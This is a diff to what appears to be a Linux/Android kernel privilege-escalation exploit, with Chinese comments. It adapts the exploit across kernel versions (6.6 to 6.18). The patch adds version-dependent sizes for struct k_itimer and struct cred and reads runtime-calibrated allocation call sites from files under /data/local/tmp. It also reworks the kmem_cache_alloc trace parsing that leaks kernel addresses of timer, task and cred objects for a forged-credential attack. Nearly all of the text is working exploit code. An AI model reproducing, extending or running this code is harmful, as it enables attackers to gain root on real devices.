@@ -60,6 +60,17 @@ static uint64_t LINK_UCOUNTS;
 static uint32_t TASK_CRED;
 static uint32_t TASK_STRUCT_SIZE;
 static uint32_t KITIMER_NODE;
+/* sizeof(struct k_itimer)：随内核版本变（6.6=0x108/264，6.18=0x180/384）。
+ * trace 里 kmem_cache_alloc 的 req 字段就是这个大小，写死会让过滤全落空。 */
+static uint64_t KITIMER_SIZE;
+/* sizeof(struct cred)：184（6.6/6.12/6.18）/ 176（5.15/6.1）。 */
+static uint64_t CRED_SIZE;
+/* 运行期实测的分配调用点（已含 slide）。由 calib_a 从 trace 解析后落盘，
+ * 有了它们就不必依赖写死的内核内锚点（6.18 开 LTO 后锚点已漂移）。 */
+static uint64_t SITE_KITIMER_RT, SITE_CRED_RT, SITE_TASK_RT;
+/* 写死锚点（do_timer_create+0xa8 / prepare_creds+0x24）只在 6.6 系可信：
+ * 它们的标定值对应的正是 6.6 的 sizeof(struct k_itimer)=0x108。 */
+#define STATIC_ANCHOR_TRUSTED (KITIMER_SIZE == 0x108ULL)
 /* call-site of the task_struct slab allocation inside copy_process (0 = unknown) */
 static uint64_t TASK_ALLOC_LINK;
 /*
@@ -78,6 +89,27 @@ static uint32_t CRED_OFF_USER_NS, CRED_OFF_UCOUNTS, CRED_OFF_GROUPS;
 
 static uint64_t g_slide = UINT64_C(0);
 #define FULLCAP UINT64_C(0x1ffffffffff)
+
+/* $CVE98260_HOME 下读一个 "0x..." 结果文件（calib_a 落盘的运行期调用点）。 */
+static uint64_t read_site_file(const char *name)
+{
+	char path[512];
+	char buf[64];
+	unsigned long long v = 0;
+	FILE *f;
+	const char *home = getenv("CVE98260_HOME");
+
+	if (!home || !*home)
+		home = "/data/local/tmp/cve98260-app";
+	snprintf(path, sizeof(path), "%s/%s", home, name);
+	f = fopen(path, "r");
+	if (!f)
+		return 0;
+	if (fgets(buf, sizeof(buf), f))
+		sscanf(buf, "0x%llx", &v);
+	fclose(f);
+	return (uint64_t)v;
+}
 
 // initialize offset table (from kernel_table)
 static int init_offsets(void) {
@@ -99,6 +131,18 @@ static int init_offsets(void) {
     KITIMER_NODE = offsets->kitimer_node;
     TASK_ALLOC_LINK = offsets->task_alloc_link;
     g_page_offset = offsets->page_offset;
+    KITIMER_SIZE = offsets->kitimer_size ? offsets->kitimer_size : 0x108ULL;
+    CRED_SIZE = offsets->cred_size ? offsets->cred_size : 184ULL;
+
+    /* 运行期实测的调用点（calib_a 产出）。有则优先于写死锚点。 */
+    SITE_KITIMER_RT = read_site_file("sites.kitimer");
+    SITE_CRED_RT = read_site_file("sites.cred");
+    SITE_TASK_RT = read_site_file("sites.task");
+    if (SITE_KITIMER_RT || SITE_CRED_RT || SITE_TASK_RT)
+        dprintf(STDOUT_FILENO,
+                "[config] runtime call sites: kitimer=%#" PRIx64 " cred=%#" PRIx64
+                " task=%#" PRIx64 "\n",
+                SITE_KITIMER_RT, SITE_CRED_RT, SITE_TASK_RT);
 
     /* forged-cred layout（profile blob v4；老 profile 已由 kernel_table.c 补 6.6 默认值） */
     CRED_PLANT_SIZE = offsets->cred_size;
@@ -659,7 +703,9 @@ static int collect_nth(int index, int *count, uint64_t *chosen)
 	uint8_t *buf = raw_buf(8U << 20);
 	size_t used = 0;
 	uint8_t needle[8];
-	uint64_t site = slide_addr(TIMER_LINK);
+	/* 匹配键：运行期实测调用点 > 写死锚点（仅 6.6 可信） > 只按 req 匹配 */
+	uint64_t site = SITE_KITIMER_RT ? SITE_KITIMER_RT : slide_addr(TIMER_LINK);
+	int filter_by_site = (SITE_KITIMER_RT != 0) || STATIC_ANCHOR_TRUSTED;
 	int fd, n = 0;
 	if (!buf)
 		return -1;
@@ -682,11 +728,11 @@ static int collect_nth(int index, int *count, uint64_t *chosen)
 	 * 真正过滤只看 req（k_itimer 大小）与 ptr（内核地址特征），故删除 got。 */
 	for (size_t i = 0; i + 32 <= used; i++) {
 		uint64_t ptr, req;
-		if (memcmp(buf + i, needle, 8))
+		if (filter_by_site && memcmp(buf + i, needle, 8))
 			continue;
 		memcpy(&ptr, buf + i + 8, 8);
 		memcpy(&req, buf + i + 24, 8);
-		if (req != 0x108 || (ptr >> 48) != 0xffff || (ptr & 7))
+		if (req != KITIMER_SIZE || (ptr >> 48) != 0xffff || (ptr & 7))
 			continue;
 		if (n < (int)(sizeof(g_all) / sizeof(g_all[0])))
 			g_all[n] = ptr;
@@ -717,7 +763,7 @@ static int collect_site(uint64_t site, uint64_t bytes, uint64_t *ptrs, int cap)
 	 * 恒为假，删除 got 仅保留 req（bytes）与 ptr 内核地址特征过滤。 */
 	for (size_t i = 0; i + 32 <= used && n < cap; i++) {
 		uint64_t ptr, req;
-		if (memcmp(buf + i, needle, 8))
+		if (site && memcmp(buf + i, needle, 8))
 			continue;
 		memcpy(&ptr, buf + i + 8, 8);
 		memcpy(&req, buf + i + 24, 8);
@@ -1967,7 +2013,8 @@ static int leak_task(void)
 	int hits = 0, by_size = 0, by_site = 0, foreign = 0, other = 0;
 	size_t scanned = 0;
 	int ncpu = cpu_count();
-	uint64_t want_site = TASK_ALLOC_LINK ? slide_addr(TASK_ALLOC_LINK) : 0;
+	uint64_t want_site = SITE_TASK_RT ? SITE_TASK_RT
+				: (TASK_ALLOC_LINK ? slide_addr(TASK_ALLOC_LINK) : 0);
 	struct freq sizes[12];
 	struct freq sites[8];
 	int nsizes = 0, nsites = 0;
@@ -2106,7 +2153,12 @@ static int leak_cred(uint64_t *cred)
 	if (syscall(SYS_setresuid, -1, -1, -1))
 		dprintf(STDOUT_FILENO, "[cred] setresuid errno=%d\n", errno);
 	write_file(TRACE "/tracing_on", "0\n");
-	n = collect_site(slide_addr(CRED_LINK), 184, ptrs, 8);
+	{
+		/* site==0 → 只按 req（cred 大小）匹配，不按调用点过滤 */
+		uint64_t csite = SITE_CRED_RT ? SITE_CRED_RT
+					: (STATIC_ANCHOR_TRUSTED ? slide_addr(CRED_LINK) : 0);
+		n = collect_site(csite, CRED_SIZE, ptrs, 8);
+	}
 	dprintf(STDOUT_FILENO, "[cred] ptrs=%d\n", n);
 	disarm_kmem_cache_alloc();
 	if (n < 1)
